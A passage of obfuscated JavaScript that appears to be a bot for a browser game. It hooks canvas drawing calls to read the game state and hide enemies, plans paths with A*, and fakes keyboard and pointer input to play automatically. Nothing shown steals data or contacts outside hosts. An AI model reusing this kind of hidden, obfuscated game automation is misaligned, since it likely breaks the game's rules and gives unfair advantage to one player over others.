                    const s = Math.abs(it.s) || 1, d = Math.hypot(it.x - canvas.width / 2, it.y - canvas.height / 2);
                    if (d < 40 * s)
                        return false;
                    const dex = (it.src.match(/\/(\d+)\//) || [])[1];
                    if (dex && dex === state.selfDex && d < 120 * s)
                        return false;
                    return mode === 2 || d > CFG.hideNear * s;
                };
                P.drawImage = function (img, ...a) {
                    if (this.canvas === canvas) {
                        const [dx, dy, dw, dh] = a.length === 8 ? a.slice(4) : a.length === 4 ? a : [a[0], a[1], img.width, img.height];
                        const it = record(this, srcName(img), dx + dw / 2, dy + dh / 2, dw, dh, img, a.length === 8 ? a.slice(0, 4) : null);
                        const mode = window.PSLite && window.PSLite.live.hide;
                        if (mode && hideEnemy(it, mode))
                            return;
                    }
                    return origDraw.call(this, img, ...a);
                };
                P.arc = function (x, y, r, a0, a1, ccw) {
                    if (this.canvas === canvas) {
                        record(this, `arc:${this.fillStyle}`, x, y, r * 2, r * 2);
                        addArc(this, x, y, r, r, 0, a0, a1, ccw);
                    }
                    return origArc.call(this, x, y, r, a0, a1, ccw);
                };
                const origText = P.fillText;
                P.fillText = function (text, ...a) {
                    if (this.canvas === canvas)
                        state.texts.push(String(text).trim());
                    return origText.call(this, text, ...a);
                };
                const PATH = { subs: [], cur: null };
                const pathOrig = { beginPath: P.beginPath, moveTo: P.moveTo, lineTo: P.lineTo, rect: P.rect, ellipse: P.ellipse, fill: P.fill, stroke: P.stroke, fillRect: P.fillRect, strokeRect: P.strokeRect };
                const tp = (ctx, x, y) => { const m = ctx.getTransform(); return { x: m.a * x + m.c * y + m.e, y: m.b * x + m.d * y + m.f }; };
                const addPt = (ctx, x, y, fresh) => {
                    if (fresh || !PATH.cur)
                        PATH.subs.push(PATH.cur = []);
                    PATH.cur.push(tp(ctx, x, y));
                };
                const addArc = (ctx, x, y, rx, ry, rot, a0, a1, ccw) => {
                    let span = ccw ? a0 - a1 : a1 - a0;
                    if (span < 0 || span > Math.PI * 2)
                        span = Math.PI * 2;
                    const n = Math.max(6, Math.ceil(span / (Math.PI / 8)));
                    for (let i = 0; i <= n; i++) {
                        const a = a0 + (ccw ? -1 : 1) * span * i / n;
                        const ex = rx * Math.cos(a), ey = ry * Math.sin(a);
                        addPt(ctx, x + ex * Math.cos(rot) - ey * Math.sin(rot), y + ex * Math.sin(rot) + ey * Math.cos(rot));
                    }
                };
                const G2 = CanvasGradient.prototype, origStop = G2.addColorStop, gradColor = new WeakMap();
                G2.addColorStop = function (at, color) { if (!gradColor.has(this))
                    gradColor.set(this, String(color).replace(/\s+/g, '')); return origStop.call(this, at, color); };
                const styleKey = s => typeof s === _0xstr(0x53e) ? s.replace(/\s+/g, '') : gradColor.has(s) ? `gradient:${gradColor.get(s)}` : _0xstr(0x53f);
                const recordShape = (ctx, kind, pts, style, src = `${kind === _0xstr(0x540) ? _0xstr(0x541) : _0xstr(0x542)}:${styleKey(style)}`) => {
                    const m = ctx.getTransform(), s = m.a;
                    if (!SITE.isWorld({ s, e: m.e, f: m.f }) || pts.length < 2)
                        return;
                    const xs = pts.map(p => p.x), ys = pts.map(p => p.y);
                    const x0 = Math.min(...xs), x1 = Math.max(...xs), y0 = Math.min(...ys), y1 = Math.max(...ys);
                    const lw = kind === _0xstr(0x543) ? ctx.lineWidth * s : 0;
                    if ((x1 - x0 + lw) * (y1 - y0 + lw) < 150 && !tagOf(src))
                        return;
                    state.frame.push({ src, x: (x0 + x1) / 2, y: (y0 + y1) / 2, w: x1 - x0 + lw, h: y1 - y0 + lw,
                        s, e: m.e, f: m.f, shape: kind, pts, lw, alpha: ctx.globalAlpha });
                };
                P.beginPath = function () { if (this.canvas === canvas) {
                    PATH.subs = [];
                    PATH.cur = null;
                } return pathOrig.beginPath.call(this); };
                P.moveTo = function (x, y) { if (this.canvas === canvas)
                    addPt(this, x, y, true); return pathOrig.moveTo.call(this, x, y); };
                P.lineTo = function (x, y) { if (this.canvas === canvas)
                    addPt(this, x, y); return pathOrig.lineTo.call(this, x, y); };
                P.rect = function (x, y, w, h) {
                    if (this.canvas === canvas) {
                        addPt(this, x, y, true);
                        addPt(this, x + w, y);
                        addPt(this, x + w, y + h);
                        addPt(this, x, y + h);
                    }
                    return pathOrig.rect.call(this, x, y, w, h);
                };
                P.ellipse = function (x, y, rx, ry, rot, a0, a1, ccw) {
                    if (this.canvas === canvas)
                        addArc(this, x, y, rx, ry, rot, a0, a1, ccw);
                    return pathOrig.ellipse.call(this, x, y, rx, ry, rot, a0, a1, ccw);
                };
                P.fill = function (...a) {
                    if (this.canvas === canvas && typeof a[0] !== _0xstr(0x544))
                        PATH.subs.forEach(sp => sp.length >= 3 && recordShape(this, _0xstr(0x545), sp, this.fillStyle));
                    return pathOrig.fill.apply(this, a);
                };
                const dashKey = ctx => { const d = ctx.getLineDash(); return d.length ? `dash:${d.join(_0xstr(0x546))}/${ctx.lineWidth}` : null; };
                P.stroke = function (...a) {
                    if (this.canvas === canvas && !a.length) {
                        const dash = dashKey(this);
                        PATH.subs.forEach(sp => { recordShape(this, _0xstr(0x547), sp, this.strokeStyle); if (dash && sp.length >= 3)
                            recordShape(this, _0xstr(0x548), sp, null, dash); });
                    }
                    return pathOrig.stroke.apply(this, a);
                };
                P.strokeRect = function (x, y, w, h) {
                    const dash = this.canvas === canvas && dashKey(this);
                    if (dash)
                        recordShape(this, _0xstr(0x549), [tp(this, x, y), tp(this, x + w, y), tp(this, x + w, y + h), tp(this, x, y + h)], null, dash);
                    return pathOrig.strokeRect.call(this, x, y, w, h);
                };
                P.fillRect = function (x, y, w, h) {
                    if (this.canvas === canvas)
                        recordShape(this, _0xstr(0x54a), [tp(this, x, y), tp(this, x + w, y), tp(this, x + w, y + h), tp(this, x, y + h)], this.fillStyle);
                    return pathOrig.fillRect.call(this, x, y, w, h);
                };
                const isTelegraph = d => {
                    const m = d.src.match(/(?:fill|stroke):(?:#([0-9a-f]{6})|rgba?\((\d+),(\d+),(\d+)(?:,([\d.]+))?\))/i);
                    if (!m)
                        return false;
                    const [r, g, b] = m[1] ? [0, 2, 4].map(i => parseInt(m[1].slice(i, i + 2), 16)) : [+m[2], +m[3], +m[4]];
                    return r >= 170 && g <= 120 && b <= 120;
                };
                const KEYS = { up: [_0xstr(0x54b), _0xstr(0x54c), 87], down: [_0xstr(0x54d), _0xstr(0x54e), 83], left: [_0xstr(0x54f), _0xstr(0x550), 65], right: [_0xstr(0x551), _0xstr(0x552), 68] };
                const sendKey = (type, key, code, keyCode) => window.dispatchEvent(new KeyboardEvent(type, { key, code, keyCode, which: keyCode, bubbles: true }));
                const setKey = (k, down) => {
                    if (!!state.keys[k] === down)
                        return;
                    state.keys[k] = down;
                    sendKey(down ? _0xstr(0x553) : _0xstr(0x554), ...KEYS[k]);
                };
                const releaseAll = () => Object.keys(KEYS).forEach(k => setKey(k, false));
                const tap = (key, code, keyCode) => { sendKey(_0xstr(0x555), key, code, keyCode); setTimeout(() => sendKey(_0xstr(0x556), key, code, keyCode), 60); };
                const tapEl = el => {
                    const r = el.getBoundingClientRect(), x = r.left + r.width / 2, y = r.top + r.height / 2;
                    const t = document.elementsFromPoint(x, y).find(e => el.contains(e)) || el;
                    const o = { bubbles: true, cancelable: true, view: window, clientX: x, clientY: y, pointerType: _0xstr(0x557), isPrimary: true };
                    t.dispatchEvent(new PointerEvent(_0xstr(0x558), o));
                    t.dispatchEvent(new PointerEvent(_0xstr(0x559), o));
                    t.click();
                };
                function applyDir(dir) {
                    state.dir = dir;
                    const [x, y] = dir || [0, 0];
                    setKey(_0xstr(0x55a), x < -0.38);
                    setKey(_0xstr(0x55b), x > 0.38);
                    setKey(_0xstr(0x55c), y < -0.38);
                    setKey(_0xstr(0x55d), y > 0.38);
                }
                const segDist = (p, a, b) => {
                    const dx = b.x - a.x, dy = b.y - a.y, l = dx * dx + dy * dy;
                    const t = l ? Math.max(0, Math.min(1, ((p.x - a.x) * dx + (p.y - a.y) * dy) / l)) : 0;
                    return Math.hypot(p.x - a.x - t * dx, p.y - a.y - t * dy);
                };
                function shapeDist(h, p) {
                    const pts = h.pts;
                    let edge = Infinity;
                    for (let i = 0; i < pts.length - 1; i++)
                        edge = Math.min(edge, segDist(p, pts[i], pts[i + 1]));
                    if (h.shape === _0xstr(0x55e))
                        return edge - h.lw / 2;
                    edge = Math.min(edge, segDist(p, pts[pts.length - 1], pts[0]));
                    let inside = false;
                    for (let i = 0, j = pts.length - 1; i < pts.length; j = i++) {
                        if ((pts[i].y > p.y) !== (pts[j].y > p.y) && p.x < (pts[j].x - pts[i].x) * (p.y - pts[i].y) / (pts[j].y - pts[i].y) + pts[i].x)
                            inside = !inside;
                    }
                    return inside ? -edge : edge;
                }
                const DIRS = Array.from({ length: 16 }, (_, i) => [Math.cos(i * Math.PI / 8), Math.sin(i * Math.PI / 8)]);
                function makeGrid(cx, cy) {
                    const R = CFG.pathRadius, n = 2 * R + 1, cell = CFG.cell;
                    const g = { n, ox: Math.floor(cx / cell) - R, oy: Math.floor(cy / cell) - R, blocked: new Uint8Array(n * n), cost: new Float32Array(n * n) };
                    g.at = (x, y) => [Math.floor(x / cell) - g.ox, Math.floor(y / cell) - g.oy];
                    g.fill = (x0, y0, x1, y1, fn) => {
                        const [i0, j0] = g.at(x0, y0), [i1, j1] = g.at(x1, y1);
                        for (let j = Math.max(0, j0); j <= Math.min(n - 1, j1); j++)
                            for (let i = Math.max(0, i0); i <= Math.min(n - 1, i1); i++)
                                fn(j * n + i, (g.ox + i + 0.5) * cell, (g.oy + j + 0.5) * cell);
                    };
                    return g;
                }
                function lineClear(g, a, b, pad = 0) {
                    const len = Math.hypot(b.x - a.x, b.y - a.y), steps = Math.ceil(len / (CFG.cell / 2));
                    const nx = pad * (a.y - b.y) / (len || 1), ny = pad * (b.x - a.x) / (len || 1);
                    for (const [ox, oy] of pad ? [[0, 0], [nx, ny], [-nx, -ny]] : [[0, 0]]) {
                        const [si, sj] = g.at(a.x + ox, a.y + oy);
                        for (let k = 1; k <= steps; k++) {
                            const [i, j] = g.at(a.x + ox + (b.x - a.x) * k / steps, a.y + oy + (b.y - a.y) * k / steps);
                            if ((i !== si || j !== sj) && i >= 0 && j >= 0 && i < g.n && j < g.n && g.blocked[j * g.n + i])
                                return false;
                        }
                    }
                    return true;
                }
                const heapPush = (h, e) => { h.push(e); let i = h.length - 1; while (i > 0) {
                    const p = (i - 1) >> 1;
                    if (h[p][0] <= e[0])
                        break;
                    h[i] = h[p];
                    i = p;
                } h[i] = e; };
                const heapPop = h => {
                    const top = h[0], last = h.pop();
                    if (h.length) {
                        let i = 0;
                        for (;;) {
                            let c = 2 * i + 1;
                            if (c >= h.length)
                                break;
                            if (c + 1 < h.length && h[c + 1][0] < h[c][0])
                                c++;
                            if (h[c][0] >= last[0])
                                break;
                            h[i] = h[c];
                            i = c;
                        }
                        h[i] = last;
                    }
                    return top;
                };
                function findPath(g, start, goal) {
                    const n = g.n, gi = goal % n, gj = (goal - gi) / n;
                    const h = idx => { const i = idx % n, dx = Math.abs(i - gi), dy = Math.abs((idx - i) / n - gj); return 1.2 * (dx + dy - 0.586 * Math.min(dx, dy)); };
                    const cost = new Float32Array(n * n).fill(Infinity), from = new Int32Array(n * n).fill(-1), done = new Uint8Array(n * n);
                    const open = [[h(start), start]];
                    cost[start] = 0;
                    let expanded = 0;
                    for (; open.length && expanded < CFG.pathMaxNodes; expanded++) {
                        const cur = heapPop(open)[1];
                        if (cur === goal) {
                            const path = [cur];
                            while (path[0] !== start)
                                path.unshift(from[path[0]]);
                            return path;
                        }
                        if (done[cur])
                            continue;
                        done[cur] = 1;
                        const ci = cur % n, cj = (cur - ci) / n;
                        for (let dy = -1; dy <= 1; dy++)
                            for (let dx = -1; dx <= 1; dx++) {
                                const ni = ci + dx, nj = cj + dy, idx = nj * n + ni;
                                if ((!dx && !dy) || ni < 0 || nj < 0 || ni >= n || nj >= n || done[idx] || (g.blocked[idx] && idx !== goal))
                                    continue;
                                if (dx && dy && (g.blocked[cj * n + ni] || g.blocked[nj * n + ci]))
                                    continue;
                                const c = cost[cur] + (dx && dy ? 1.414 : 1) + g.cost[idx];
                                if (c < cost[idx]) {
                                    cost[idx] = c;
                                    from[idx] = cur;
                                    heapPush(open, [c + h(idx), idx]);
                                }
                            }
                    }
                    return open.length || expanded < 30 ? [] : null;
                }
                function tick(frame) {
                    const piloted = !!(SITE.pilot && SITE.pilot.active());
                    if (piloted && state.dir)
                        applyDir(null);
                    let world = frame.filter(SITE.isWorld);
                    if (!world.length)
                        return;
                    const pokes = world.filter(d => CFG.enemyRe.test(d.src));
                    const cam = SITE.camera(world, pokes);
                    const s = cam.s;
                    const me = { x: canvas.width / 2, y: canvas.height / 2 };
                    const sc = SITE.scene && SITE.scene(cam);
                    const dexOf = src => (src.match(/\/(\d+)\//) || [])[1];
                    const centre = d => Math.hypot(d.x - me.x, d.y - me.y);
                    const closest = (list, max) => list.reduce((b, d) => { const r = centre(d); return r < max && (!b || r < b.r) ? { d, r } : b; }, null);
                    const self = !sc && ((state.selfDex && closest(pokes.filter(d => dexOf(d.src) === state.selfDex), 120 * s)) || closest(pokes, 40 * s));
                    if (self && dexOf(self.d.src)) {
                        const v = state.selfVotes = state.selfVotes || {};
                        v[dexOf(self.d.src)] = (v[dexOf(self.d.src)] || 0) + 1;
                        state.selfDex = Object.keys(v).reduce((a, b) => (v[b] > v[a] ? b : a));
                    }
                    let enemies = sc ? sc.enemies : pokes.filter(d => d !== (self && self.d) && !(state.selfDex && dexOf(d.src) === state.selfDex && centre(d) < 120 * s));
                    if (sc) {
                        me.x = sc.me.x;
                        me.y = sc.me.y;
                    }
                    else if (self) {
                        me.x = self.d.x;
                        me.y = self.d.y;
                    }
                    const obj = !sc && SITE.objective ? SITE.objective(world, me, cam) : null;
                    if (obj && obj.hide.size) {
                        world = world.filter(d => !obj.hide.has(d));
                        enemies = enemies.filter(d => !obj.hide.has(d));
                    }
                    const byTag = t => sc ? sc[t] || [] : world.filter(d => tagOf(d.src) === t);
                    const auras = !sc && SITE.bossAura ? world.filter(d => d.shape && SITE.bossAura(d.src) && Math.abs(d.w) / s >= 40) : [];
                    for (const a of auras) {
                        const e = enemies.reduce((b, e) => (!b || Math.hypot(e.x - a.x, e.y - a.y) < Math.hypot(b.x - a.x, b.y - a.y) ? e : b), null);
                        if (e && Math.hypot(e.x - a.x, e.y - a.y) < Math.max(Math.abs(e.h), Math.abs(a.w)))
                            e.boss = a;
                    }
                    const goods = byTag(_0xstr(0x55f)), rifts = byTag(_0xstr(0x560)), buffs = byTag(_0xstr(0x561)), xps = byTag(_0xstr(0x562)).filter(d => !auras.includes(d)), cases = byTag(_0xstr(0x563));
                    const hazards = sc ? sc.hazard.slice() : world.filter(d => tagOf(d.src) === _0xstr(0x564) || (d.shape && !tagOf(d.src) && CFG.autoTelegraph && isTelegraph(d)))
                        .map(d => (SITE.hazardShape && SITE.hazardShape(d)) || d);
                    {
                        const now = performance.now(), dt = Math.max(1, now - (state.shotsAt || now)), prev = state.shots || [];
                        const shots = byTag(_0xstr(0x565)).map(d => ({ d, x: (d.x - cam.e) / s, y: (d.y - cam.f) / s }));
                        for (const p of shots) {
                            const q = prev.reduce((b, q) => { const r = Math.hypot(q.x - p.x, q.y - p.y); return r < 80 && (!b || r < b.r) ? { q, r } : b; }, null);
                            const k = q ? CFG.shotLookahead / dt : 0, end = { x: p.x + (p.x - (q ? q.q.x : p.x)) * k, y: p.y + (p.y - (q ? q.q.y : p.y)) * k };
                            hazards.push({ src: p.d.src, shape: _0xstr(0x566), lw: Math.max(Math.abs(p.d.w), Math.abs(p.d.h)), x: p.d.x, y: p.d.y, w: p.d.w, h: p.d.h,
                                pts: [{ x: p.d.x, y: p.d.y }, { x: end.x * s + cam.e, y: end.y * s + cam.f }] });
                        }
                        state.shots = shots;
                        state.shotsAt = now;
                    }
                    const terrain = sc ? sc.terrain || [] : SITE.terrain ? world.flatMap(d => {
                        const tiles = SITE.terrain(d);
                        if (!tiles)
                            return [];
                        const tw = Math.abs(d.w) / 16, x0 = d.x - Math.abs(d.w) / 2, y0 = d.y - Math.abs(d.h) / 2, out = [];
                        for (let t = 0; t < 256; t++)
                            if (tiles[t])
                                out.push({ x: x0 + (t % 16) * tw, y: y0 + Math.floor(t / 16) * tw, w: tw, kind: tiles[t] });
                        return out;
                    }) : [];
                    const prizes = byTag(_0xstr(0x567)), heals = byTag(_0xstr(0x568));
                    state.view = { me, enemies, goods, hazards, rifts, buffs, heals, xps, cases, prizes, s, terrain };
                    const footprint = d => {
                        const w = Math.abs(d.w) / s, h = Math.abs(d.h) / s;
                        if (/^G:/.test(d.src))
                            return { x: d.x, y: d.y, rw: w / 2.5, of: d };
                        if (Math.max(w, h) >= 128)
                            return { x: d.x, y: d.y, rw: Math.max(w, h) / 2, box: d, of: d };
                        const pf = SITE.propFoot;
                        if (pf)
                            return { x: d.x, y: d.y + (h / 2 - pf.up) * s, rw: pf.r, of: d };
                        return h > w * 1.2 ? { x: d.x, y: d.y + (h / 2 - w / 4) * s, rw: w / 4, of: d } : { x: d.x, y: d.y, rw: w * 0.4, of: d };
                    };
                    if (piloted) {
                        state.view.walls = byTag(_0xstr(0x569)).concat(byTag(_0xstr(0x56a))).map(footprint);
                        if (SITE.pilot.overlay)
                            Object.assign(state.view, SITE.pilot.overlay(cam));
                        return;
                    }
                    const now = performance.now();
                    const e0 = cam.e, f0 = cam.f;
                    const toScreen = w => ({ x: w.x * s + e0, y: w.y * s + f0 });
                    const meW = { x: (me.x - e0) / s, y: (me.y - f0) / s };
                    state.walls = state.walls.filter(w => w.until > now);
                    state.ignore = state.ignore.filter(w => w.until > now);
                    const xpNow = xps.map(d => ({ x: (d.x - e0) / s, y: (d.y - f0) / s, sx: d.x, sy: d.y, rest: false }));
                    for (const p of xpNow)
                        p.rest = state.prevXp.some(q => Math.hypot(p.x - q.x, p.y - q.y) < 4);
                    for (const q of state.prevXp) {
                        if (!q.rest || xpNow.some(p => Math.hypot(p.x - q.x, p.y - q.y) < 4))
                            continue;
                        const onScreen = q.sx > 30 && q.sy > 30 && q.sx < canvas.width - 30 && q.sy < canvas.height - 30;
                        const d = Math.hypot(q.x - state.prevMe.x, q.y - state.prevMe.y);
                        if (onScreen && d > 20 && d < state.magnet * 3)
                            state.magnet = state.magnet * 0.8 + d * 0.2;
                    }
                    state.prevXp = xpNow;
                    state.prevMe = meW;
                    if (now - (state.timerChangedAt || now) > 1500 || SITE.choiceOpen() || !state.dir)
                        state.posHist.length = 0;
                    else
                        state.posHist.push(meW);
                    if (state.posHist.length > 20) {
                        const old = state.posHist.shift();
                        const travel = state.posHist.reduce((a, p, i) => a + (i ? Math.hypot(p.x - state.posHist[i - 1].x, p.y - state.posHist[i - 1].y) : 0), 0);
                        if (state.on && state.dir && Math.hypot(meW.x - old.x, meW.y - old.y) < 3 && travel < 12) {
                            const ahead = { x: meW.x + state.dir[0] * 40, y: meW.y + state.dir[1] * 40 };
                            const crowd = enemies.some(e => Math.hypot((e.x - e0) / s - ahead.x, (e.y - f0) / s - ahead.y) - Math.max(Math.abs(e.w), Math.abs(e.h)) / 2 / s < CFG.contact + 20);
                            if (!crowd)
                                state.walls = state.walls.concat({ ...ahead, until: Infinity }).slice(-300);
                            if (!crowd)
                                state.stuck = state.stuck.filter(t => t > now - 3000).concat(now);
                            if (!crowd && state.stuck.length >= 2) {
                                if (state.prevTarget && !state.prevTarget.enemy && !state.prevTarget.rift && !state.prevTarget.quest && !(state.path && state.path.cells.length))
                                    state.ignore.push({ ...state.prevTarget.w, until: now + 20000 });
                                const away = state.walls.filter(w => Math.hypot(meW.x - w.x, meW.y - w.y) < 200).reduce((a, w) => [a[0] + meW.x - w.x, a[1] + meW.y - w.y], [0, 0]);
                                const ang = Math.atan2(away[1], away[0]) + (Math.random() - 0.5) * Math.PI / 1.5;
                                state.escape = { dir: [Math.cos(ang), Math.sin(ang)], until: now + 900 };
                                state.stuck = [];
                            }
                            state.posHist.length = 0;
                        }
                    }
                    if (!state.on)
                        return;
                    if (state.dead)
                        return void applyDir(null);
                    const dist = (a, b) => Math.hypot(a.x - b.x, a.y - b.y) / s;
                    const edge = e => dist(e, me) - Math.max(Math.abs(e.w), Math.abs(e.h)) / 2 / s;
                    const nearestTo = list => list.reduce((b, d) => (!b || dist(d, me) < dist(b, me) ? d : b), null);
                    const inHazard = d => hazards.some(h => (h.shape ? shapeDist(h, d) : Math.hypot(d.x - h.x, d.y - h.y) - Math.max(Math.abs(h.w), Math.abs(h.h)) / 2) < 0);
                    const crowded = d => enemies.some(e => dist(d, e) - Math.max(Math.abs(e.w), Math.abs(e.h)) / 2 / s < CFG.contact * 0.75);
                    const inLane = d => enemies.some(e => segDist(e, me, d) / s - Math.max(Math.abs(e.w), Math.abs(e.h)) / 2 / s < CFG.contact * 0.5);
                    const reachable = list => list.filter(d => !inHazard(d) && !crowded(d) && !inLane(d) && !state.ignore.some(w => Math.hypot((d.x - e0) / s - w.x, (d.y - f0) / s - w.y) < 50));
                    const hp = state.hpRatio ?? 1;
                    state.hpLog = (state.hpLog || []).filter(([t]) => now - t < CFG.hurtWindow);
                    state.hpLog.push([now, hp]);
                    if (Math.max(...state.hpLog.map(([, v]) => v)) - hp >= CFG.hurtDrop)
                        state.hurtUntil = now + CFG.hurtHold;
                    const low = hp < CFG.lowHp || now < (state.hurtUntil || 0);
                    const zm = SITE.zMove;
                    if (zm && now > (state.zAt || 0)) {
                        const inZ = enemies.filter(e => dist(e, me) < zm.radius).length;
                        if (inZ >= CFG.zCrowd || (low && inZ >= CFG.zCrowdLow)) {
                            tap(...zm.key);
                            state.zAt = now + 1000;
                        }
                    }
                    const solid = d => !(!sc && SITE.terrain && SITE.terrain(d));
                    const walls = state.walls.map(w => ({ ...toScreen(w), rw: 0 })).concat(byTag(_0xstr(0x56b)).filter(solid).map(footprint), byTag(_0xstr(0x56c)).map(footprint));
                    const unignored = list => list.filter(d => !state.ignore.some(w => Math.hypot((d.x - e0) / s - w.x, (d.y - f0) / s - w.y) < 50));
                    const rift = nearestTo(unignored(rifts)), good = nearestTo(reachable(goods)), foe = nearestTo(enemies);
                    const prize = nearestTo(unignored(prizes).filter(d => !inHazard(d) && !(low && d.engage)));
                    const buff = nearestTo(reachable(buffs)), quest = obj && obj.target && unignored([obj.target])[0];
                    if (buff && dist(buff, me) < CFG.buffReach)
                        state.ignore.push({ x: (buff.x - e0) / s, y: (buff.y - f0) / s, until: now + CFG.buffCooldown });
                    const atDwell = d => dist(d, me) < CFG.caseReach * 2 || (state.dwell && Math.hypot((d.x - e0) / s - state.dwell.x, (d.y - f0) / s - state.dwell.y) < 30);
                    const dwellCase = hp >= CFG.holdHp ? nearestTo(unignored(cases).filter(atDwell)) : null;
                    const kase = dwellCase || nearestTo(reachable(cases));
                    const rock = nearestTo(reachable(byTag(_0xstr(0x56d))).filter(d => dist(d, me) < CFG.breakRange));
                    const paused = now - (state.timerChangedAt || now) > 1500;
                    const dt = Math.min(100, now - (state.lastTick || now));
                    state.lastTick = now;
                    const dwellOn = [kase, rock].find(d => d && dist(d, me) < CFG.caseReach);
                    if (dwellOn) {
                        const kw = { x: (dwellOn.x - e0) / s, y: (dwellOn.y - f0) / s };
                        if (!state.dwell || Math.hypot(state.dwell.x - kw.x, state.dwell.y - kw.y) > 30)
                            state.dwell = { ...kw, t: 0 };
                        if (!paused)
                            state.dwell.t += dt;
                        if (state.dwell.t > CFG.caseTime) {
                            state.ignore.push({ ...kw, until: now + 60000 });
                            state.dwell = null;
                            log(dwellOn === kase ? _0xstr(0x56e) : _0xstr(0x56f));
                        }
                    }
                    else
                        state.dwell = null;
                    const atHealing = d => state.healing && Math.hypot((d.x - e0) / s - state.healing.x, (d.y - f0) / s - state.healing.y) < 30;
                    const heal = hp < (state.healing ? 0.99 : CFG.healBelow)
                        ? (hp >= CFG.holdHp && nearestTo(unignored(heals).filter(atHealing))) || nearestTo(reachable(heals)) : null;
                    if (heal && dist(heal, me) < CFG.healReach) {
                        const hw = { x: (heal.x - e0) / s, y: (heal.y - f0) / s };
                        if (!state.healing || Math.hypot(state.healing.x - hw.x, state.healing.y - hw.y) > 30 || paused || hp > state.healing.hp + 0.01)
                            state.healing = { ...hw, hp, t: now };
                        else if (now - state.healing.t > CFG.healIdle) {
                            state.ignore.push({ ...hw, until: now + CFG.healIgnore });
                            state.healing = null;
                            log(_0xstr(0x570));
                        }
                    }
                    else if (!heal)
                        state.healing = null;
                    let target = null, weight = 0, stop = 0, hold = false, xp;
                    if (rift) {
                        target = rift;
                        weight = CFG.riftWeight;
                    }
                    else if (prize) {
                        target = prize;
                        weight = CFG.prizeWeight;
                        stop = prize.engage ? CFG.engage : 0;
                    }
                    else if (heal && dist(heal, me) < CFG.goodRange) {
                        target = heal;
                        weight = CFG.goodWeight;
                        hold = dist(heal, me) < CFG.healReach;
                    }
                    else if (quest && ((!low && hp > CFG.questHp && enemies.filter(e => edge(e) < CFG.contact).length < CFG.questCrowd) || (dist(quest, me) < quest.hold && hp >= CFG.holdHp))) {
                        target = quest;
                        hold = dist(quest, me) < quest.hold;
                        weight = hold ? CFG.questWeight : CFG.goodWeight;
                    }
                    else if (kase && (!low || kase === dwellCase) && dist(kase, me) < CFG.goodRange) {
                        target = kase;
                        weight = CFG.goodWeight;
                        hold = dist(kase, me) < CFG.caseReach;
                    }
                    else if (buff && dist(buff, me) >= CFG.buffReach && dist(buff, me) < CFG.goodRange) {
                        target = buff;
                        weight = CFG.goodWeight;
                    }
                    else if (good && dist(good, me) < CFG.goodRange) {
                        target = good;
                        weight = CFG.goodWeight;
                    }
                    else if (!low && (xp = nearestTo(xps.filter(d => dist(d, me) > state.magnet * 0.8 && !inHazard(d) && !crowded(d) && !inLane(d)))) && dist(xp, me) < CFG.xpRange) {
                        target = xp;
                        weight = CFG.xpWeight;
                        stop = state.magnet * 0.6;
                    }
                    if (rock && !low && (!target || (target === xp && dist(rock, me) < 150))) {
                        target = rock;
                        weight = CFG.goodWeight;
                        stop = 0;
                        hold = dist(rock, me) < CFG.caseReach;
                    }
                    else if (!target && foe && !low && hp >= CFG.huntHp && enemies.filter(e => edge(e) < 200).length < CFG.huntCrowd) {
                        target = foe;
                        weight = CFG.huntWeight;
                        stop = foe.boss ? CFG.bossEngage : CFG.engage + Math.max(Math.abs(foe.w), Math.abs(foe.h)) / 2 / s;
                    }
                    state.view.target = target;
                    state.view.quest = quest;
                    state.prevTarget = target && { enemy: target === foe, rift: target === rift, quest: target === quest, w: { x: (target.x - e0) / s, y: (target.y - f0) / s } };
                    state.view.walls = walls;
                    state.pin = (state.pin || []).filter(p => now - p.t < CFG.pinTime);
                    const atGoal = target && Math.abs(dist(target, me) - stop) < CFG.pinMove * 2;
                    if (paused || SITE.choiceOpen() || !state.dir || hold || atGoal || (state.escape && state.escape.until > now))
                        state.pin.length = 0;
                    else
                        state.pin.push({ t: now, ...meW });
                    if (state.pin.length > 1 && now - state.pin[0].t > CFG.pinTime * 0.9 && state.pin.every(p => Math.hypot(p.x - meW.x, p.y - meW.y) < CFG.pinMove)) {
                        const W = (x, y, r) => ({ x, y, r });
                        const near = state.walls.map(w => W(w.x, w.y, 60))
                            .concat(walls.filter(w => w.rw).map(w => W((w.x - e0) / s, (w.y - f0) / s, w.rw + 60)))
                            .concat(terrain.filter(t => t.kind === 1).map(t => W((t.x + t.w / 2 - e0) / s, (t.y + t.w / 2 - f0) / s, t.w / s / 2 + 50)))
                            .filter(w => Math.hypot(meW.x - w.x, meW.y - w.y) < w.r);
                        if (near.length) {
                            const away = near.reduce((a, w) => { const l = Math.hypot(meW.x - w.x, meW.y - w.y) || 1; return [a[0] + (meW.x - w.x) / l, a[1] + (meW.y - w.y) / l]; }, [0, 0]);
                            const ang = Math.atan2(away[1], away[0]) + (Math.random() - 0.5) * Math.PI / 3;
                            state.escape = { dir: [Math.cos(ang), Math.sin(ang)], until: now + 900 };
                            log(_0xstr(0x571));
                        }
                        state.pin.length = 0;
                    }
                    const escape = state.escape && state.escape.until > now ? state.escape.dir : null;
                    const stay = hold && target !== rock && hp >= CFG.holdHp;
                    const tileW = terrain.length ? terrain[0].w / s : 0;
                    const wallTiles = new Set(terrain.filter(t => t.kind === 1).map(t => `${Math.round((t.x - e0) / s / tileW)},${Math.round((t.y - f0) / s / tileW)}`));
                    const wallAt = (x, y) => wallTiles.size > 0 && wallTiles.has(`${Math.floor(x / tileW)},${Math.floor(y / tileW)}`);
                    function planPath(from, to) {
                        const g = makeGrid(from.x, from.y), pad = CFG.bodyRadius, W = d => ({ x: (d.x - e0) / s, y: (d.y - f0) / s });
                        for (const d of walls) {
                            if (!d.rw || d.of === target)
                                continue;
                            const c = W(d);
                            if (d.box) {
                                const hw = Math.abs(d.box.w) / 2 / s + pad, hh = Math.abs(d.box.h) / 2 / s + pad;
                                g.fill(c.x - hw, c.y - hh, c.x + hw, c.y + hh, i => { g.blocked[i] = 1; });
                                continue;
                            }
                            const r = d.rw + pad, [ci, cj] = g.at(c.x, c.y);
                            g.fill(c.x - r, c.y - r, c.x + r, c.y + r, (i, x, y) => { if (Math.hypot(x - c.x, y - c.y) < r)
                                g.blocked[i] = 1; });
                            if (ci >= 0 && cj >= 0 && ci < g.n && cj < g.n)
                                g.blocked[cj * g.n + ci] = 1;
                        }
                        for (const w of state.walls)
                            g.fill(w.x - 24 - pad, w.y - 24 - pad, w.x + 24 + pad, w.y + 24 + pad, i => { g.blocked[i] = 1; });
                        for (const t of terrain) {
                            const x = (t.x - e0) / s, y = (t.y - f0) / s, w = t.w / s;
